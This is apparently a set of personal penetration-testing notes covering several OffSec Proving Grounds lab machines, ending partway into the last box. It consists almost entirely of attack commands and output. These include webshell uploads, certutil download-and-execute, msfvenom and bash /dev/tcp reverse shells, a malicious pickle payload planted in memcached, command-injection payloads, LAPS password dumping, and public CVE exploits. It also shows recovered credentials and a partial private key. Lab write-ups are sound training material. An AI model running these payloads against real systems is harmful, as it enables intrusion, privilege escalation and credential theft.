crackmapexec smb 192.168.96.122 -u fmcsorley -p CrabSharkJellyfish192
	SMB         192.168.96.122  445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
	SMB         192.168.96.122  445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192
	#valid user, enumerate smb
smbmap -H 192.168.96.122 -u fmcsorley -p CrabSharkJellyfish192 --admin -q
smbmap -H 192.168.96.122 -u fmcsorley -p CrabSharkJellyfish192
	IPC$                                                    READ ONLY       Remote IPC
	NETLOGON                                                READ ONLY       Logon server share
	SYSVOL                                                  READ ONLY       Logon server share
smbclient \\\\192.168.96.122\\SYSVOL -U fmcsorley
>prompt OFF
>recurse ON
>mget *
find . -type f
	./hutch.offsec/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
	./hutch.offsec/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/comment.cmtx
	./hutch.offsec/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Registry.pol
	#there is nothing on smbshare, if there are groups.xml might be something like blackfield htb
	#looking up hint there are webdav enable
cat tcp_80_http_nmap.txt
	http-webdav-scan:
	|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
cat tcp_80_http_nikto.txt
	+ WebDAV enabled (UNLOCK MKCOL PROPFIND LOCK PROPPATCH COPY listed as allowed)
	#upload webshell werbdav
cadaver http://192.168.96.122
	Username: fmcsorley
>put cmd.aspx
http://hutch.offsec/cmd.aspx
	/c certutil.exe -urlcache -split -f http://192.168.49.96/rshell.exe C:\temp\rshell.exe
	/c C:\temp\rshell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o rshell.exe
rlwral nc -lvp 80
>whoami
	iis apppool\defaultapppool
	#I tried this privesc but failed
	#https://0x00-0x00.github.io/research/2019/05/30/Coding-a-reliable-CVE-2019-0841-Bypass.html
>cd \
>dir program files
	.....
	11/03/2020  09:59 PM    <DIR>          LAPS
	.....
>dir LAPS
	09/22/2016  08:02 AM            64,664 AdmPwd.UI.exe
	09/22/2016  08:02 AM            33,952 AdmPwd.Utils.dll
	11/03/2020  09:59 PM    <DIR>          CSE
	#dump LAPS ( Local Administrator Password Solution )
	#https://www.hackingarticles.in/credential-dumpinglaps/
ldapsearch -x -h 192.168.96.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
	...
	dn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
	ms-Mcs-AdmPwd: 7w2]ZIG),vZQ#r
	....
	#got credz, there is another way which what I did
wget https://github.com/swisskyrepo/SharpLAPS/releases/download/latest-SharpLAPS/SharpLAPS.exe
>SharpLAPS.exe /user:hutch.offsec\fmcsorley /pass:CrabSharkJellyfish192 /host:127.0.0.1
	[+] Extracting LAPS password from LDAP
	Machine  : HUTCHDC$
	Password : 7w2]ZIG),vZQ#r
crackmapexec smb 192.168.96.122 -u administrator  -p '7w2]ZIG),vZQ#r'
	SMB         192.168.96.122  445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
	SMB         192.168.96.122  445    HUTCHDC          [+] hutch.offsec\administrator:7w2]ZIG),vZQ#r (Pwn3d!)
psexec.py 'administrator:7w2]ZIG),vZQ#r@192.168.96.122'
>whoami
	nt authority\system
	#sharpprint nightmare always join the party
>whoami
	iis apppool\defaultapppool
>systeminfo
	OS Name:                   Microsoft Windows Server 2019 Standard
	OS Version:                10.0.17763 N/A Build 17763
>Get-Service -Name Spooler
	Status   Name               DisplayName
	------   ----               -----------
	Running  Spooler            Print Spooler
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f dll -o rev.dll
>SharpPrintNightmare.exe C:\temp\rev.dll
rlwrap nc -lvp 80
>whoami
	nt authority\system
	#another privesc seimpersonate windows server 2019
>whoami
	iis apppool\defaultapppool
>whoami /priv
	Privilege Name                Description                               State
	============================= ========================================= ========
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
>systeminfo
	OS Name:                   Microsoft Windows Server 2019 Standard
	OS Version:                10.0.17763 N/A Build 17763
>PrintSpoofer.exe -c "\temp\rshell.exe" -i
rlwrap nc -lvp 80
>whoami
	hutch\hutchdc$
	#got domain admin user









Compromised ProvingGrounds
============================================
sudo autorecon 192.168.151.152
sudo nmap -p- 192.168.151.152 --open -Pn -sV -oN fullnmap
cat fullnmap
	80/tcp    open  http          Microsoft IIS httpd 10.0
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
	445/tcp   open  microsoft-ds?
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	#nothing in http port
cat smbmap-share-permissions.txt
	IPC$                                                    READ ONLY       Remote IPC
	Scripts$                                                READ ONLY
	Users$                                                  READ ONLY
smbclient \\\\192.168.151.152\\Scripts$ -U anonymous
>mget *
cat fix-printservers.ps1
	$credential = New-Object System.Management.Automation.PSCredential ('scripting', $password)
	$spooler = Get-WmiObject -Class Win32_Service -ComputerName (Read-Host -Prompt 'Server Name') -Credential $credential -Filter "Name='spooler'"
	#there is run as powershell command with user scripting but there is no $password variable
smbclient \\\\192.168.151.152\\Users$ -U anonymous
>prompt OFF
>recurse ON
>mget *
find . -type f | grep .ps1
	./scripting/Documents/WindowsPowerShell/profile.ps1
cat ./scripting/Documents/WindowsPowerShell/profile.ps1
	$password = ConvertTo-SecureString "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA')))" -AsPlainText -Force
	#found password variable
echo RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA | base64 -d
	FriendsDontLetFriendsBase64Passwords
crackmapexec smb 192.168.96.152 -u 'scripting' -p FriendsDontLetFriendsBase64Passwords
crackmapexec winrm 192.168.96.152 -u 'scripting' -p FriendsDontLetFriendsBase64Passwords
	WINRM       192.168.151.152 5985   NONE             [+] None\scripting:FriendsDontLetFriendsBase64Passwords (Pwn3d!)
	#sure I can winrm
evil-winrm -i 192.168.151.152 -u scripting -p FriendsDontLetFriendsBase64Passwords
>whoami
	compromised\scripting
>cd \troubleshooting
>type logs.ps1
	Get-EventLog -LogName 'Windows Powershell' | Export-CSV C:\Troubleshooting\powershell-logs.csv
>.\logs.ps1
>download powershell-logs.csv
cat powershell-logs.csv
	....
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABPAHcAbgBl......QB4AH0A
	#there is execution base64 encryption
echo -n JABPAHcAbgBl......QB4AH0A | base64 -d > hasil.txt
cat hasil.txt
	$Owned = @();$Owned += {$Decoded = [System.Convert]::FromBase64String("H4sIAAAAAAAEAAvJSA3OSM3J8Sz2zUzPKMlMLQrJSMwLAYqW5xelKAIA07xkHB8AAAA=")};
	$Owned += {[string]::join('', ( (83....
	$Owned += {if($env:computername -eq "compromised") {exit}};
	$Owned += {[string]::join('', ( (105,102,32....
	$Owned += {[string]::join('', ( (105,102,32,40,36,111....
	$Owned += {[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("KAB....
	$Owned | % {$_|iex}
	#idk what that was so I open up someone walktrough
	#actually we can decode it by run it on powershell
>string]::join('', ( (83,116,97,114,116,45,83,108,101,101,112,32,45,83,101,99,111,110,100,115,32,53) |%{ ( [char][int] $_)}))
	Start-Sleep -Seconds 5
>[string]::join('', ( (105,102,32.....04,41,41,125) |%{ ( [char][int] $_)}))
	if ($owned[2].ToString() -ne 'if($env:computername -eq "compromised") {exit}') {exit} Else {$ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length))}
	#if sleep then exit
>[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("KABOAGUAdw.....AG4AZAAoACkA"))
	(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend()
	#so edit script by remove {exit} fucntion
>$Decoded = [System.Convert]::FromBase64String("H4sIAAAAAAAEAAvJSA3OSM3J8Sz2zUzPKMlMLQrJSMwLAYqW5xelKAIA07xkHB8AAAA=")
>$ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length))
>(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend()
	TheShellIsMightierThanTheSword!
	#got password might administrator password
crackmapexec smb 192.168.151.152 -u administrator -p TheShellIsMightierThanTheSword!
crackmapexec winrm 192.168.151.152 -u administrator -p TheShellIsMightierThanTheSword!
	WINRM       192.168.151.152 5985   NONE             [+] None\administrator:TheShellIsMightierThanTheSword! (Pwn3d!)
psexec.py 'administrator:TheShellIsMightierThanTheSword!@192.168.151.152'
	#failed
evil-winrm -i 192.168.151.152 -u administrator -p TheShellIsMightierThanTheSword!
>whoami
	compromised\administrator
	#excalate administrator to system
>upload PsExec64.exe
>\PsExec64.exe -i -d -accepteula -s C:\temp\nc.exe 192.168.49.62 80 -e cmd.exe
lwrap nc -lvp 80
>whoami
	nt authority\system




Shifty ProvingGrounds
======================================
sudo autorecon 192.168.62.59
cat fullnmap
	22/tcp    open  ssh       OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
	80/tcp    open  http      nginx 1.10.3
	5000/tcp  open  http      Werkzeug httpd 1.0.1 (Python 3.5.3)
	11211/tcp open  memcached Memcached 1.4.33 (uptime 2927 seconds)
	#dump memcached value
https://gist.github.com/GazerLog/9424006
wget https://gist.github.com/GazerLog/9424006/raw/04951bb10d2cc6285bf4edcaf2c65c19ed9912d4/Memcached%2520Export%2520All%2520Keys%2520and%2520Values
sudo apt-get install php-memcache
php mem.php > dumpmem.txt
cat dumpmem.txt | grep session | sort -u | cut -d ':' -f 2-
	#enumerate memcached
	#this blogpost describe really good injection on memcached, look at platform table who might got RCE
	#https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf
telnet 192.168.62.59 11211
>version
	VERSION 1.4.33
>stats
>stats items
	STAT items:3:number 22491
	STAT items:4:number 1
>stats cachedump <item-number> <rows>
>stats cachedump 4 100
	ITEM session:8cc4d39b-47ac-4e09-b5ac-e43211cbe435 [50 b; 1640414422 s]
>get session:8cc4d39b-47ac-4e09-b5ac-e43211cbe435
	(dp0
	Vusername
	p1
	Vadmin
	p2
	sV_permanent
	p3
	I01
	s.
	#look like pickle session, save that output as pickle.txt
	#update data memcached
	#https://lzone.de/cheat-sheet/memcached
set session:8cc4d39b-47ac-4e09-b5ac-e43211cbe439 0 900 88
cposix
system
p1
(S'bash -c "bash -i >& /dev/tcp/192.168.49.62/80 0>&1"'
p2
tRp2
.
	STORED
cat pickle.txt | base64
	KGRwMApWdXNlcm5hbWUKcDEKVmFkbWluCnAyCnNWX3Blcm1hbmVudApwMwpJMDEKcy4=
python
>import base64
>import pickle
>pickled=base64.b64decode("KGRwMApWdXNlcm5hbWUKcDEKVmFkbWluCnAyCnNWX3Blcm1hbmVudApwMwpJMDEKcy4=")
>pickled
	'(dp0\nVusername\np1\nVadmin\np2\nsV_permanent\np3\nI01\ns.'
>pickle.loads(pickled)
	{u'username': u'admin', u'_permanent': True}
	#actually using python3
python3
>pickle.loads(pickled)
	{'username': 'admin', '_permanent': True}
	#pickle RCE, remember different python version different exploit
	#I tried create pickle rce
	#https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd
	#spen 6 hours to get it work since it works on my pickle
	#turn out that payload only works on python2, I tried to compile payload with python2
	#and need script to send bit payload to memcached
cat payload.py
	class RCE(object):
    def __reduce__(self):
        return os.system, ("bash -c 'bash -i >& /dev/tcp/192.168.49.62/80 0>&1'",)
cat update.py
	client = base.Client(("192.168.62.59", 11211))
	client.set(sys.argv[1], pickle.dumps(RCE()))
python3 ex.py session:db5b7273-cc26-47be-b7ff-ad7f869aaf1a
	#update sesison and refresh
nc -lvp 80
>whoami
	jerry
>cat /opt/backups/backup.py
	....
	data = file.read()
	k = des(b"87629ae8", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
	cipertext = k.encrypt(data)
	dest.write(cipertext)
	#create reverse decrypt
>cat ex.py
	...
	k = des(b"87629ae8", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
	with open('/opt/backups/data/{}'.format(sys.argv[1])) as f:
		data = f.read()
		print(k.decrypt(data))
>python ex.py 31328fa57f5c504df041f7f4f45498c766c0d12c33f78f33cff66bca
	-----BEGIN RSA PRIVATE KEY-----
	MIIEpAIBAAKCAQEAsw9sPBI6js7DDqEruZrZn6kaDLV3sttQfZdz9DOn6KKbP82u
	6VXlmC28TzwrSPPhQBYH0BjSQsrU7KiYvjFbPm0XTx4vXuaE132gLeBTFyGiixTb
	....
chmod 600 id_root
ssh root@192.168.62.59 -i id_root
#whoami
	root







XposedAPI ProvingGrounds
=========================================
sudo autorecon 192.168.62.134
sudo nmap -p- 192.168.62.134 --open -Pn -sV -oN fullnmap
cat fullnmap
	22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	13337/tcp open  http    Gunicorn 20.0.4
nikto --host http://192.168.62.134:13337/
http://192.168.62.134:13337/
	#API with some vulnerability
http://192.168.62.134:13337/logs
	WAF: Access Denied for this Host.
	#bypass waf
	#https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c
	#API logs vulnerable to LFI
GET /logs?file=/home/clumsyadmin/local.txt HTTP/1.1
GET /logs?file=/etc/passwd HTTP/1.1
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
	root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	....
POST /update
Content-Type: application/json
{"user":"clumsyadmin", "url":"http://192.168.49.62:22/"}
	#got connection back
nc -lvp 22
	GET / HTTP/1.1
	Host: 192.168.49.62:22
	User-Agent: curl/7.64.0
POST /update
Content-Type: application/json
{"user":"clumsyadmin", "url":"http://192.168.49.62:22/$(whoami)"}
	GET /clumsyadmin HTTP/1.1
	#got rce, now reverse shell
{"user":"clumsyadmin", "url":"http://192.168.49.62:22/$(bash -c 'bash -i >& /dev/tcp/192.168.49.62/13337 0>&1')"}
>whoami
	clumsyadmin
	#turned out that was not the itended path
	#rce with upload reverse payload
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=tun0 LPORT=13337
	#I tried two different payload elf shell and python shell
	#then restart the API
POST /restart HTTP/1.1
nc -lvp 22
nc -lvp 13337
	#Idk logic behind this, I upload shell by curl and restart a service and got rce
	#I got connection back on both port like idk there are bash script run all file on that working directory (?)
>whoami
	clumsyadmin
>bash linpeas.txt | tee clumsyadmin-xposedapi-linpeas.txt
	-rwsr-xr-x 1 root root 456K Apr  5  2019 /usr/bin/wget
	#wget privesc wget suid
cat passwd.txt
	rooot:z3Y6fq9si1hCQ:0:0:root:/root:/bin/bash
>wget 192.168.49.62:22/passwd.txt -O /etc/passwd
>su rooot
ssh rooot@192.168.62.134
#whoami
	root






Bratarina ProvingGrounds
===========================================
sudo autorecon 192.168.62.71
sudo nmap -p- 192.168.62.134 --open -Pn -sV -oN fullnmap
cat fullnmap
	22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	25/tcp  open  smtp        OpenSMTPD
	80/tcp  open  http        nginx 1.14.0 (Ubuntu)
	445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: COFFEECORP)
cat tcp_25_smtp_nmap.txt
	25/tcp open  smtp    syn-ack ttl 63 OpenSMTPD
	|_banner: 220 bratarina ESMTP OpenSMTPD
	| smtp-commands: bratarina Hello nmap.scanme.org [192.168.49.62], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
	|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
	#remember that nmap can't identify correctly the version of OpenSMTPD
searchsploit open smtpd
	OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)		| linux/remote/48038.rb
	#exploit cve-2020-7247 opensmptd 6.4-6.6
msfconsole
>search opensmtpd
>use exploit/unix/smtp/opensmtpd_mail_from_rce
>search payload cmd unix
>set payload cmd/unix/generic
>set cmd wget 192.168.49.62/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=tun0 LPORT=445
>run
#whoami
	root
	#manual exploit cve-2020-7247 opensmptd 6.4-6.6
https://github.com/QTranspose/CVE-2020-7247-exploit
wget https://github.com/QTranspose/CVE-2020-7247-exploit/raw/main/exploit.py
cat exploit.py
	...
	bash -c 'bash -i >& /dev/tcp/{rev_host}/{rev_port} 0>&1'
sudo pip3 install -U pwntools
python3 exploit.py 192.168.62.71 25 192.168.49.62 80 root@localhost
#whoami
	root







Twiggy ProvingGrounds
======================================
sudo autorecon 192.168.160.62
cat fullnmap
	22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
	53/tcp   open  domain  NLnet Labs NSD
	80/tcp   open  http    nginx 1.16.1
	4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
	4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
	8000/tcp open  http    nginx 1.16.1
nc 192.168.160.62 4505
	#no response and idk what is that service
	#detect salt-api
	#I google pentesting port 4505 4506, then that exploit db came up
https://www.exploit-db.com/exploits/48421
wget https://www.exploit-db.com/download/48421
sudo pip3 install salt
	#exploit Saltstack 3000.1 RCE cve-2020-11652 cve-2020-11651 (all saltstack under 3000.2)
	#detect salt-api 3000-1
curl http://192.168.160.62:8000 -v
	...
	X-Upstream: salt-api/3000-1
python3 48421 -m 192.168.160.62 -p 4506
	[+] Checking if vulnerable to CVE-2020-11651... YES
python3 48421 -m 192.168.160.62 -p 4506 --exec 'ping -c 4 192.168.49.160'
sudo tcpdump -i tun0 icmp
	02:35:53.461421 IP 192.168.160.62 > 192.168.49.160: ICMP echo request, id 22426, seq 1, length 64
	02:35:53.461495 IP 192.168.49.160 > 192.168.160.62: ICMP echo reply, id 22426, seq 1, length 64
python3 48421 -m 192.168.160.62 -p 4506 --exec 'bash -i >& /dev/tcp/192.168.49.160/80 0>&1'
nc -lvp 80
#whoami
	root
	#in case don't have rce
python3 48421 -m 192.168.160.62 -p 4506 -r /etc/passwd
python3 48421 -m 192.168.160.62 -p 4506 -r /etc/shadow
python3 48421 -m 192.168.160.62 -p 4506 --upload-src passwd.txt --upload-dest '../../../../../../../../etc/passwd'
ssh rooot@192.168.160.62
#whoami
	root









QuackerJack ProvingGrounds
====================================
sudo autorecon 192.168.160.57
sudo nmap -p- 192.168.160.57 --open -Pn -sV -oN fullnmap
cat fullnmap
	21/tcp   open  ftp         vsftpd 3.0.2
	22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
	80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
	111/tcp  open  rpcbind     2-4 (RPC #100000)
	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
	445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
	3306/tcp open  mysql       MariaDB (unauthorized)
	8081/tcp open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
	#there are nothing in ftp, smb, mysql and http port 80
https://192.168.160.57:8081/login.php
	rConfig - Configuration Management
	rConfig Version 3.9.4   © rConfig 2015 - 2021
	#exploit rConfig 3.4.9 RCE
searchsploit rconfig
	rConfig 3.9.4 - 'search.crud.php' Remote Command Injection						| php/webapps/48241.py
	rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote Code Execution		| php/webapps/48261.py
searchsploit -m 48421
	#I change the payload to make it works
cat 48421
	payload = '''`bash -c "bash -i >& /dev/tcp/192.168.49.160/80 0>&1"`'''.format(ip, port)
python3 48261.py https://192.168.160.57:8081/ 192.168.49.160 80
nc -lvp 80
>whoami
	apache
	#turned out walktrough using different exploit
searchsploit rconfig
	rConfig 3.93 - 'ajaxAddTemplate.php' Authenticated Remote Code Execut			| php/webapps/48207.py
searchsploit -m 48207
	#bruteforce login using burp and 500-worst-passwords.txt password file
	#fail, can use another exploit to get user password
https://www.exploit-db.com/exploits/48208
python3 exploit.py https://192.168.160.57:8081/
	#found admin:abgrtyu
python 48207.py https://192.168.160.57:8081/ admin abgrtyu 192.168.49.160 80
>whoami
	apache
>find / -perm -4000 2>/dev/null | xargs ls -laht
	-rwsr-xr-x. 1 root root 195K Oct 30  2018 /usr/bin/find
	#suid find privesc find
>find . -exec /bin/bash -p \; -quit
#whoami
	root




Sorcerer ProvingGrounds
========================================
sudo autorecon 192.168.160.100
sudo nmap -p- 192.168.160.100 --open -Pn -sV -oN fullnmap
cat fullnmap
	22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	80/tcp    open  http     nginx
	111/tcp   open  rpcbind  2-4 (RPC #100000)
	2049/tcp  open  nfs_acl  3 (RPC #100227)
	7742/tcp  open  http     nginx
	8080/tcp  open  http     Apache Tomcat 7.0.4
	43329/tcp open  nlockmgr 1-4 (RPC #100021)
	45519/tcp open  mountd   1-3 (RPC #100005)
	54375/tcp open  mountd   1-3 (RPC #100005)
	55683/tcp open  mountd   1-3 (RPC #100005)
showmount -e 192.168.160.100
http://192.168.160.100
	#nothing in port 80
http://192.168.160.100:8080/manager/html
	#no access tomcat manager
http://192.168.160.100:7742/zipfiles/
	francis.zip                                        24-Sep-2020 19:27                2834
	max.zip                                            24-Sep-2020 19:27                8274
	miriam.zip                                         24-Sep-2020 19:27                2826
	sofia.zip                                          24-Sep-2020 19:27                2818
binwalk max.zip
	843           0x34B           Zip archive data, at least v2.0 to extract, compressed size: 592, uncompressed size: 738, name: home/max/.ssh/id_rsa.pub
	1517          0x5ED           Zip archive data, at least v2.0 to extract, compressed size: 654, uncompressed size: 836, name: home/max/.ssh/authorized_keys
unzip max.zip
cat home/max/.ssh/authorized_keys
	no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAA........azWQQ== max@sorcerer
	#some weird autorized keys, apperently I can get pty and no execution at all
chmod max_idrsa
ssh max@192.168.160.100 -i max_idrsa
	PTY allocation request failed on channel 0
	ACCESS DENIED.
	#bypass by upload new authorized_keys via scp
scp -i max_idrsa authorized_keys max@192.168.160.100:/home/max/.ssh/authorized_keys
ssh max@192.168.160.100 -i max_idrsa
>whoami
	max
>max@sorcerer:~$ bash linpeas.sh | tee max-sorcerer-linpeas.txt
	-rwsr-xr-x 1 root root 44K Jun  3  2019 /usr/sbin/start-stop-daemon
	#start-stop-daemon suid privesc
>/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
#whoami
	root







UC404 ProvingGrounds
=============================================
sudo autorecon 192.168.160.109
sudo nmap -p- 192.168.160.109 --open -Pn -sV -oN fullnmap
cat fullnmap
	22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
	111/tcp   open  rpcbind  2-4 (RPC #100000)
	2049/tcp  open  nfs_acl  3 (RPC #100227)
	36931/tcp open  mountd   1-3 (RPC #100005)
gobuster dir -u http://192.168.160.109/ -w /opt/directory-list-2.3-medium.txt --timeout 100s -t 50 -b 404,400
	/under_construction   (Status: 301) [Size: 331] [--> http://192.168.160.109/under_construction/]
http://192.168.160.109/under_construction/
	#dump git dump .git
sudo pip3 install git-dumper
git-dumper http://192.168.160.109/under_construction/.git/ .
git checkout .
find .
	./reset.html
	./forgot.html
	./index.html
	./register.html
	#the original scrip are html but on the box there are php
gobuster dir -u http://192.168.160.109/under_construction/ -w /opt/directory-list-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -x .php,.html,.txt
	/index.php            (Status: 200) [Size: 2950]
	/forgot.php           (Status: 200) [Size: 2729]
	#view source forgot.php there are parameter under development
view-source:http://192.168.160.109/under_construction/forgot.php
	---- Under Construction ----
	sendmail.php must receive the variable from the html form and send the message.
	|| For security reasons we are working to blacklist some characters ||
	#fuzz parameter php escape
cat parameter.txt
	%00
	\x00
	%0d
	%0a
	%0d%0a
	;
	&&
	$(sleep 5)
	`sleep 5`
	$
	"
	'
	#working php escape parameter php parameter escape
	#$(sleep 5) &0asleep 5   `sleep 5`
http://192.168.160.109/under_construction/forgot.php?email=$(sleep%205)
http://192.168.160.109/under_construction/forgot.php?email=%0asleep%205
http://192.168.160.109/under_construction/forgot.php?email=`sleep%205`
	%0a wget 192.168.49.160/p0wny.php
http://192.168.160.109/under_construction/p0wny.php
	bash -c "bash -i >& /dev/tcp/192.168.49.160/80 0>&1"
nc -lvp 80
>whoami
	www-data
>find / -writable 2>/dev/null | grep -v 'proc\|cache\|dev\|www'
	/var/backups/sendmail.php.bak
>cat /var/backups/sendmail.php.bak
	$connect=mysql_connect("localhost","brian","BrianIsOnTheAir789") or die("Could not connect to database");
>su brian
>whoami
	brian
>sudo -l
	(ALL) NOPASSWD: /usr/bin/git
	#git privesc
>sudo git -p help config
!/bin/sh
#whoami
	root








ZenPhoto ProvingGrounds
===========================================
sudo autorecon 192.168.160.41
sudo nmap -p- 192.168.160.41 --open -Pn -sV -oN fullnmap
cat fullnmap
	22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
	23/tcp   open  ipp     CUPS 1.4
	80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
	3306/tcp open  mysql   MySQL (unauthorized)
cat tcp_3306_mysql_nmap.txt
mysql -h 192.168.160.41 -u root -p
	ERROR 1130 (HY000): Host '192.168.49.160' is not allowed to connect to this MySQL server
cat tcp_80_http_nikto.txt
	+ OSVDB-3092: /test/: This might be interesting...
http://192.168.160.41/
	UNDER CONTRUCTION
	#nothig here
http://192.168.160.41/test/
http://192.168.160.41/test/
	Zenphoto CMS (?)
	#actually when I finisshed and check walktrough, we can see the version by view-source
searchsploit zenphoto exec
	ZenPhoto - Config Update / Command Execution							| php/webapps/15114.php
	ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution		| php/webapps/18083.php
cat 18083.php
	$packet  = "POST {$path}zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php HTTP/1.0\r\n";
	#check are page exist
http://192.168.160.41/test/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php
	Permission denied: session/ is not writable.
	#yes it is, Exploit Zenphoto 1.4.1.4 ajax_create_folder.php RCE
php 18083.php 192.168.160.41 /test/
>whoami
	www-data
>bash -c "bash -i >& /dev/tcp/192.168.49.160/80 0>&1"
>whoami
	www-data
>cd /var/www
>find . | grep conf
	./test/zp-data/zp-config.php
>cat ./test/zp-data/zp-config.php
	$conf['mysql_user'] = 'root';           // Supply your Database user id.
	$conf['mysql_pass'] = 'hola';           // Supply your Database password.
	#there is nothing in mysql and mysql run as user mysql
>ps -aux | grep mysql
	mysql      917  0.0  1.8 146700 18996 ?        Ssl  05:25   0:00 /usr/sbin/mysqld
>bash linpeas.sh | tee www-offsecsrv-linpeas.txt
	[+] [CVE-2010-3904] rds
	Details: http://www.securityfocus.com/archive/1/514379
	Exposure: highly probable
searchsploit rds linux
	Linux Kernel 2.6.36-rc8 - 'RDS Protocol' Local Privilege Escalation		| linux/local/15285.c
	#exploit linux kernel 2.6.36 rds
>uname -a
	Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
wget http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
>gcc -w linux-rds-exploit.c -o exp
./exp
	...
	[*] Got root!
#whoami
	root









Walla provingGrounds
==========================================
sudo autorecon 192.168.160.97
sudo nmap -p- 192.168.160.97 --open -Pn -sV -oN fullnmap
cat fullnmap
	23/tcp    open  telnet     Linux telnetd
	25/tcp    open  smtp       Postfix smtpd
	53/tcp    open  tcpwrapped
	422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	8091/tcp  open  http       lighttpd 1.4.53
	42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
nc 192.168.160.97 23
	Linux Telnetd 0.17
searchsploit telnet 0.17
	netkit-telnet-0.17 telnetd (Fedora 31) - 'BraveStarr' Remote Code Execution				| linux/remote/48170.py
python3 48170.py -H 192.168.160.97 -p 23 -t 50 leak
